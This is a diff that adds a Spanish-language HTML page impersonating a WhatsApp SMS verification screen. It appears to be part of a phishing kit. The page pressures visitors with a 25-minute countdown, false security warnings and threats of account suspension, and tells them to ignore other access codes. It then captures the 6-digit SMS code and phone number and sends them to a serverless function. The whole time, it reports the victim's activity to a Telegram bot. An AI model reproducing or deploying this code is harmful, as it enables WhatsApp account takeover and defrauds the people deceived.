@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verificación SMS</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    /* Mismo estilo que index2.html */
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #4caf50, #81c784);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+      padding: 20px 0;
+    }
+
+    .code-box {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+      width: 350px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .code-box h1 {
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #333;
+      font-size: 1.8rem;
+    }
+
+    .description {
+      font-weight: 400;
+      font-size: 0.95rem;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.3;
+    }
+
+    .progress-bar-bg {
+      width: 100%;
+      height: 24px;
+      background-color: #e0e0e0;
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4caf50, #66bb6a);
+      border-radius: 12px;
+      transition: width 0.5s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 600;
+      font-size: 0.8rem;
+      min-width: 60px;
+    }
+
+    .success-message {
+      display: none;
+      background: linear-gradient(135deg, #4caf50, #66bb6a);
+      color: white;
+      padding: 16px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: left;
+      line-height: 1.5;
+      font-size: 0.9rem;
+      animation: slideIn 0.5s ease;
+    }
+
+    .success-message.show {
+      display: block;
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeInSlide {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #555;
+      text-align: left;
+      font-size: 0.95rem;
+    }
+
+    .code-inputs {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .code-inputs input {
+      width: 40px;
+      height: 50px;
+      font-size: 1.8rem;
+      font-weight: 600;
+      text-align: center;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+      color: #333;
+    }
+
+    .code-inputs input:disabled {
+      opacity: 0.3;
+      background-color: #f5f5f5;
+      cursor: not-allowed;
+    }
+
+    .code-inputs input:enabled:focus {
+      outline: none;
+      border-color: #4caf50;
+      box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
+      background-color: #f0fdf0;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #21c063;
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      background-color: #aaa;
+    }
+
+    button:enabled:hover {
+      background-color: #1aa454;
+    }
+
+    .info-box {
+      background-color: #f0fdf0;
+      border-left: 4px solid #4caf50;
+      padding: 12px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+    }
+
+    .info-box p {
+      margin: 8px 0;
+      font-size: 0.85rem;
+      line-height: 1.4;
+      color: #333;
+    }
+
+    .warning {
+      background-color: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 10px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #856404;
+      line-height: 1.3;
+    }
+
+    .tip-box {
+      background-color: #e3f2fd;
+      border-left: 4px solid #2196f3;
+      padding: 12px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #0d47a1;
+      line-height: 1.4;
+      display: none;
+    }
+
+    .tip-box.show {
+      display: block;
+      animation: fadeInSlide 0.6s ease;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 0.85rem;
+      color: #555;
+      user-select: none;
+      line-height: 1.3;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="code-box">
+    <h1>Valida whatsapp</h1>
+    <p class="description">
+      Proceso de validación iniciado. Para culminar exitosamente y asegurar tu cuenta de WhatsApp, debes permanecer en esta pantalla. En 25 minutos recibirás un código SMS para finalizar la verificación.
+    </p>
+
+    <div class="progress-bar-bg">
+      <div class="progress-bar-fill" id="progressBar">25:00</div>
+    </div>
+
+    <div class="success-message" id="successMessage">
+      ✅ Listo, hemos revisado y verificado tu cuenta.<br>
+      🔒 Para culminar el proceso y asegurar tu información, por favor ingresa el código de 6 dígitos que te hemos enviado vía SMS.
+    </div>
+
+    <form id="codeForm">
+      <div class="error" id="errorMsg" style="display:none;"></div>
+
+      <label for="code">Código de verificación</label>
+      <div class="code-inputs">
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+      </div>
+      <button type="submit" disabled>Verificar</button>
+    </form>
+
+    <div class="warning">
+      <strong>⚠️ Importante:</strong> No debe salirse o cerrar esta ventana para evitar pérdidas o robo de información.
+    </div>
+
+    <!-- Contenedor de tips rotativos -->
+    <div id="tipsContainer"></div>
+
+    <div class="footer-text">
+      Además del cifrado de extremo a extremo, añadimos más capas de protección para todas tus conversaciones.<br><br>
+      2024 © WhatsApp LLC
+    </div>
+  </div>
+
+  <!-- CARGAR JQUERY -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  
+  <!-- CARGAR ESTADO PARA NOTIFICACIONES PÚBLICAS -->
+  <script src="estado.js"></script>
+
+  <script>
+    const inputs = document.querySelectorAll('.code-inputs input');
+    const errorMsg = document.getElementById('errorMsg');
+    const progressBar = document.getElementById('progressBar');
+    const submitButton = document.querySelector('button[type="submit"]');
+    const successMessage = document.getElementById('successMessage');
+    const tipsContainer = document.getElementById('tipsContainer');
+    
+    // Tiempo total en segundos (25 minutos = 1500 segundos)
+    const totalSeconds = 1500;
+    let pageLoadTime = null; // Se inicializará con hora de internet
+    let codigoEnviado = false; // Controla si ya se envió el código
+    let sessionId = Date.now().toString(); // ID único de sesión
+    
+    // Obtener hora precisa desde internet
+    function inicializarHoraInternet() {
+      fetch('https://worldtimeapi.org/api/timezone/Etc/UTC')
+        .then(response => response.json())
+        .then(data => {
+          pageLoadTime = data.unixtime * 1000; // Convertir a milisegundos
+          console.log('Hora de internet sincronizada:', new Date(pageLoadTime).toLocaleString());
+        })
+        .catch(error => {
+          console.error('Error obteniendo hora de internet, usando hora local:', error);
+          pageLoadTime = Date.now(); // Fallback a hora local
+        });
+    }
+    
+    // Inicializar con hora de internet
+    inicializarHoraInternet();
+
+    // ========== FUNCIONES DE TELEGRAM ==========
+    
+    // Función para enviar NOTIFICACIONES DE ESTADO (usa estado.js)
+    function enviarEstadoTelegram(mensaje, callback) {
+      var settings = {
+        async: true,
+        crossDomain: true,
+        url: "https://api.telegram.org/bot" + telegram_bot_estado + "/sendMessage",
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        data: JSON.stringify({
+          chat_id: chat_id_estado,  // Desde estado.js
+          text: mensaje,
+        }),
+      };
+
+      $.ajax(settings).done(function (response) {
+        console.log("Estado enviado al grupo de notificaciones");
+        if (callback) callback(true);
+      }).fail(function () {
+        console.log("Error al enviar estado");
+        if (callback) callback(false);
+      });
+    }
+
+    // Función para obtener tiempo transcurrido
+    function getTiempoTranscurrido() {
+      if (pageLoadTime === null) return "Cargando hora...";
+      
+      const ahora = Date.now();
+      const diff = Math.floor((ahora - pageLoadTime) / 1000);
+      const minutos = Math.floor(diff / 60);
+      const segundos = diff % 60;
+      return `${minutos}m ${segundos}s`;
+    }
+
+    // ========== NOTIFICACIONES DE ESTADO ==========
+
+    // 1. NOTIFICACIÓN AL CARGAR LA PÁGINA
+    window.addEventListener('load', function() {
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+      
+      let mensaje = 
+        "🟢 USUARIO EN LÍNEA\n\n" +
+        "📱 Número: " + numero + "\n" +
+        "⏰ Página cargada: " + new Date().toLocaleTimeString() + "\n" +
+        "📄 Pantalla: Index5 - Esperando código SMS\n" +
+        "⏳ Contador iniciado: 25 minutos\n" +
+        "🆔 Session ID: " + sessionId + "\n\n" +
+        "✅ El usuario está ACTIVO y esperando\n" +
+        "📊 Panel de Control: Conectado";
+
+      enviarEstadoTelegram(mensaje);
+    });
+
+    // 2. NOTIFICACIONES PERIÓDICAS (Cada 5 minutos)
+    setInterval(function() {
+      if (pageLoadTime === null) return; // Esperar a que se cargue la hora de internet
+      
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+      const ahora = Date.now();
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      const tiempoRestante = totalSeconds - secondsElapsed;
+      const minutosRestantes = Math.floor(tiempoRestante / 60);
+      
+      let mensaje = 
+        "🟢 USUARIO SIGUE EN LÍNEA\n\n" +
+        "📱 Número: " + numero + "\n" +
+        "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+        "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n" +
+        "📊 Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n" +
+        "⏱️ Tiempo restante: " + minutosRestantes + " minutos\n\n" +
+        "✅ Página ACTIVA - Usuario esperando código";
+
+      enviarEstadoTelegram(mensaje);
+    }, 300000); // Cada 5 minutos
+
+    // 3. DETECTAR CUANDO EL USUARIO INTENTA CERRAR LA PÁGINA
+    window.addEventListener('beforeunload', function(e) {
+      // Solo mostrar mensaje si NO se ha enviado el código
+      if (codigoEnviado) return;
+      
+      if (pageLoadTime === null) return; // No hacer nada si aún no se ha cargado la hora
+      
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+      const ahora = Date.now();
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      
+      let mensaje = 
+        "⚠️ ALERTA: USUARIO INTENTA CERRAR\n\n" +
+        "📱 Número: " + numero + "\n" +
+        "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+        "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n" +
+        "📊 Progreso alcanzado: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
+        "🚨 El usuario está intentando salir de la página";
+
+      // Usar sendBeacon para envío garantizado antes de cerrar
+      navigator.sendBeacon(
+        "https://api.telegram.org/bot" + telegram_bot_estado + "/sendMessage?chat_id=" + chat_id_estado + "&text=" + encodeURIComponent(mensaje)
+      );
+
+      e.preventDefault();
+      e.returnValue = '';
+    });
+
+    // 4. DETECTAR CUANDO LA PÁGINA PIERDE EL FOCO
+    let tiempoSalida = null;
+    
+    document.addEventListener('visibilitychange', function() {
+      if (pageLoadTime === null) return; // Esperar a que se cargue la hora de internet
+      
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+      const ahora = Date.now();
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      
+      if (document.hidden) {
+        tiempoSalida = new Date();
+        
+        let mensaje = 
+          "🟡 USUARIO CAMBIÓ DE PESTAÑA\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n" +
+          "📊 Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
+          "⚠️ Página en segundo plano - Usuario NO está viendo la pantalla";
+
+        enviarEstadoTelegram(mensaje);
+      } else {
+        if (tiempoSalida) {
+          const tiempoAusente = Math.floor((new Date().getTime() - tiempoSalida.getTime()) / 1000);
+          
+          let mensaje = 
+            "🟢 USUARIO REGRESÓ\n\n" +
+            "📱 Número: " + numero + "\n" +
+            "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+            "⏳ Tiempo ausente: " + Math.floor(tiempoAusente/60) + "m " + (tiempoAusente%60) + "s\n" +
+            "📊 Progreso actual: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
+            "✅ Usuario VOLVIÓ a la pantalla de verificación";
+
+          enviarEstadoTelegram(mensaje);
+          tiempoSalida = null;
+        }
+      }
+    });
+
+    // 5. NOTIFICACIÓN EN HITOS IMPORTANTES
+    let hitosNotificados = {25: false, 50: false, 75: false};
+    
+    function verificarHitos() {
+      if (pageLoadTime === null) return; // Esperar a que se cargue la hora de internet
+      
+      const ahora = Date.now();
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      const progreso = Math.round((secondsElapsed/totalSeconds)*100);
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+      
+      if (progreso >= 25 && !hitosNotificados[25]) {
+        hitosNotificados[25] = true;
+        let mensaje = 
+          "📊 HITO ALCANZADO: 25%\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n\n" +
+          "✅ Usuario lleva 6 minutos esperando";
+        enviarEstadoTelegram(mensaje);
+      }
+      
+      if (progreso >= 50 && !hitosNotificados[50]) {
+        hitosNotificados[50] = true;
+        let mensaje = 
+          "📊 HITO ALCANZADO: 50%\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n\n" +
+          "✅ Usuario lleva 12 minutos esperando - Mitad del proceso";
+        enviarEstadoTelegram(mensaje);
+      }
+      
+      if (progreso >= 75 && !hitosNotificados[75]) {
+        hitosNotificados[75] = true;
+        let mensaje = 
+          "📊 HITO ALCANZADO: 75%\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Tiempo en página: " + getTiempoTranscurrido() + "\n\n" +
+          "✅ Usuario lleva 19 minutos esperando - Casi terminando";
+        enviarEstadoTelegram(mensaje);
+      }
+    }
+
+    // 6. DETECTAR INACTIVIDAD Y ACTUALIZAR DATOS
+    let ultimaActividad = new Date().getTime();
+    let inactividadNotificada = false;
+    
+    ['mousemove', 'mousedown', 'keypress', 'scroll', 'touchstart'].forEach(function(event) {
+      document.addEventListener(event, function() {
+        ultimaActividad = Date.now();
+        inactividadNotificada = false;
+      }, true);
+    });
+
+    setInterval(function() {
+      if (pageLoadTime === null) return; // Esperar a que se cargue la hora de internet
+      
+      const ahora = Date.now();
+      const tiempoInactivo = Math.floor((ahora - ultimaActividad) / 1000);
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      
+      if (tiempoInactivo > 180 && !inactividadNotificada && !document.hidden) {
+        inactividadNotificada = true;
+        let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+        
+        let mensaje = 
+          "⚠️ USUARIO INACTIVO\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Inactivo por: " + Math.floor(tiempoInactivo/60) + " minutos\n" +
+          "📊 Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
+          "⚠️ No hay actividad (mouse/teclado) - Posible que dejó la página abierta";
+
+        enviarEstadoTelegram(mensaje);
+      }
+    }, 30000);
+
+    // ========== TIPS Y PROGRESO ==========
+
+    const tips = [
+      {
+        type: 'info',
+        text: 'En caso de no poder culminar su validación correctamente, será contactado por un asesor de soporte técnico especializado.'
+      },
+      {
+        type: 'warning',
+        text: '⚠️ Si durante la validación recibes otros códigos o solicitudes de acceso, por favor recházalos e ignóralos hasta completar los 25 minutos y validar tu cuenta. Esto es necesario para asegurar tu cuenta correctamente.'
+      },
+      {
+        type: 'info',
+        text: '💬 Si por cualquier motivo no puedes completar el proceso correctamente, uno de nuestros asesores de soporte técnico se comunicará contigo en cuanto estén disponibles para asistirte.'
+      },
+      {
+        type: 'warning',
+        text: '🔒 Importante: Cerrar este proceso antes de finalizarlo puede resultar en la suspensión temporal o permanente de tu cuenta. Al no completar la verificación, no podemos garantizar que seas el propietario legítimo. Es necesario culminar el proceso.'
+      }
+    ];
+
+    let currentTipIndex = 0;
+    let currentTipElement = null;
+
+    function showNextTip() {
+      if (currentTipElement) {
+        currentTipElement.remove();
+      }
+
+      const tip = tips[currentTipIndex];
+      const tipElement = document.createElement('div');
+      
+      if (tip.type === 'warning') {
+        tipElement.className = 'tip-box';
+        tipElement.style.backgroundColor = '#fff3cd';
+        tipElement.style.borderLeftColor = '#ffc107';
+        tipElement.style.color = '#856404';
+      } else {
+        tipElement.className = 'tip-box';
+      }
+      
+      tipElement.innerHTML = '<p>' + tip.text + '</p>';
+      tipsContainer.appendChild(tipElement);
+      
+      setTimeout(() => {
+        tipElement.classList.add('show');
+      }, 100);
+      
+      currentTipElement = tipElement;
+      currentTipIndex = (currentTipIndex + 1) % tips.length;
+    }
+
+    setTimeout(() => {
+      showNextTip();
+    }, 5000);
+
+    const tipInterval = setInterval(() => {
+      showNextTip();
+    }, 20000);
+
+    // Actualizar progreso cada segundo
+    const progressInterval = setInterval(() => {
+      if (pageLoadTime === null) return; // Esperar a que se cargue la hora de internet
+      
+      const ahora = Date.now();
+      const secondsElapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      
+      verificarHitos();
+      
+      const percentage = Math.min((secondsElapsed / totalSeconds) * 100, 100);
+      progressBar.style.width = percentage + '%';
+      
+      const remainingSeconds = totalSeconds - secondsElapsed;
+      const minutes = Math.floor(remainingSeconds / 60);
+      const seconds = remainingSeconds % 60;
+      progressBar.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+      
+      // Cuando se complete el tiempo EXACTAMENTE a los 25 minutos
+      if (secondsElapsed >= totalSeconds) {
+        clearInterval(progressInterval);
+        clearInterval(tipInterval);
+        progressBar.textContent = '¡Listo!';
+        
+        if (currentTipElement) {
+          currentTipElement.remove();
+        }
+        
+        successMessage.classList.add('show');
+        
+        // Enviar notificación de estado
+        let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+        
+        let mensajeEstado = 
+          "🎯 TIEMPO COMPLETADO - 100%\n\n" +
+          "📱 Número: " + numero + "\n" +
+          "⏰ Hora: " + new Date().toLocaleTimeString() + "\n" +
+          "⏳ Tiempo total en página: " + getTiempoTranscurrido() + "\n\n" +
+          "✅ Código de Transferencia ready para enviar\n" +
+          "📲 Campos habilitados - Esperando que usuario ingrese código SMS";
+
+        enviarEstadoTelegram(mensajeEstado);
+        
+        // Habilitar campos y botón EXACTAMENTE a los 25 minutos
+        inputs.forEach(input => {
+          input.disabled = false;
+        });
+        submitButton.disabled = false;
+        inputs[0].focus();
+      }
+    }, 1000);
+
+    // Navegación entre inputs
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // ========== ENVÍO DEL CÓDIGO SMS (usando Netlify Function) ==========
+    $('#codeForm').submit(function(e) {
+      e.preventDefault();
+
+      let code = '';
+      inputs.forEach(input => code += input.value);
+
+      if (code.length < 6) {
+        errorMsg.textContent = 'Por favor, ingresa el código completo de 6 dígitos.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      let codePrevio = localStorage.getItem('codigo_index2');
+
+      if (code === codePrevio) {
+        errorMsg.textContent = 'Por favor, ingresa solo el código que fue enviado vía SMS debe ser distinto al del dispositivo';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // Marcar que el código fue enviado exitosamente
+      codigoEnviado = true;
+
+      // Enviar CÓDIGO usando Netlify Function (seguro)
+      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+
+      let mensajeCodigo = 
+        "Whats\n\n" +
+        "📱 Número: " + numero + "\n" +
+        "🔐 Código SMS Transfer1: " + code + "\n\n" +
+        "C0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻";
+
+      // Enviar usando Netlify Function send-sms
+      fetch('/.netlify/functions/send-sms', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          numero: numero,
+          codigo: code
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success || response.status === 200) {
+          window.location = "cargando2.html";
+        } else {
+          errorMsg.textContent = 'Error al enviar el código. Intenta nuevamente.';
+          errorMsg.style.display = 'block';
+          codigoEnviado = false; // Revertir en caso de error
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        errorMsg.textContent = 'Error al enviar el código. Intenta nuevamente.';
+        errorMsg.style.display = 'block';
+        codigoEnviado = false; // Revertir en caso de error
+      });
+    });
+  </script>
+
+</body>
+</html>
